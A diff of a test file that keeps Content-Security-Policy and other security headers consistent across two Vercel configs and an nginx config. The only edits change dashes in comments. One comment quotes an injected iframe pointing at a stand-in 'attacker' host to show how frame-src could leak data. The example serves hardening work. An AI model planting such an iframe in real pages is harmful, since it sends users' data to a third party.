@@ -3,10 +3,10 @@
  * Security headers must not drift between deployment paths.
  *
  * There are THREE places the same policy is expressed (SUSE assessment 2026-08, S2):
- *   1. vercel.json               — the live hosted deployment (project rootDirectory
+ *   1. vercel.json - the live hosted deployment (project rootDirectory
  *                                  is the repo root, so this is the one that ships)
- *   2. shells/web/vercel.json    — a build rooted at the web shell instead
- *   3. deploy/docker/nginx.conf  — the self-hosted container
+ *   2. shells/web/vercel.json - a build rooted at the web shell instead
+ *   3. deploy/docker/nginx.conf - the self-hosted container
  *
  * Three copies of a security control is exactly how one of them silently loses a
  * directive. This test pins them together, and pins the directives that carry the
@@ -77,7 +77,7 @@ test('the nginx header snippet carries the same four headers as vercel', () => {
 
 test('every nginx location that sets its own add_header re-includes the snippet', () => {
   // nginx DROPS inherited add_header directives in any location that declares one
-  // of its own — the single most common way a header silently stops shipping.
+  // of its own - the single most common way a header silently stops shipping.
   const locations = [...nginx.matchAll(/location\s+=?\s*([^\s{]+)\s*\{([^}]*)\}/g)]
     .map(m => ({ path: m[1] ?? '', body: m[2] ?? '' }));
   const offenders = locations
@@ -116,7 +116,7 @@ test('the directives that carry the security value are present', () => {
   // frame-src is an EXFILTRATION directive here, not just a framing one. An
   // injected script cannot fetch to an arbitrary host (connect-src), but it can
   // append <iframe src="https://attacker/?d=…"> and the browser makes that
-  // request — so a scheme-wide `https:` grant would hand back everything
+  // request - so a scheme-wide `https:` grant would hand back everything
   // connect-src is holding, which is this policy's entire stated value. The cost
   // of keeping it closed is community/url-shot's live composer preview, whose
   // capture path runs in the extension/desktop shell anyway.
@@ -149,7 +149,7 @@ test('script-src carries unsafe-eval WITH the reason recorded, not by accident',
 test('every host docs/privacy.md discloses is ALLOWED by the CSP', () => {
   // The direction that bites hardest. An egress host the app really uses, missing
   // from the policy, is a feature that works everywhere except the deployed build
-  // — and it fails in the browser console, where nobody is looking. The ICC press
+  // - and it fails in the browser console, where nobody is looking. The ICC press
   // profiles (registry.color.org) were exactly this: documented, shipping, and
   // absent from the first draft of the policy.
   const privacy = read('docs/privacy.md');
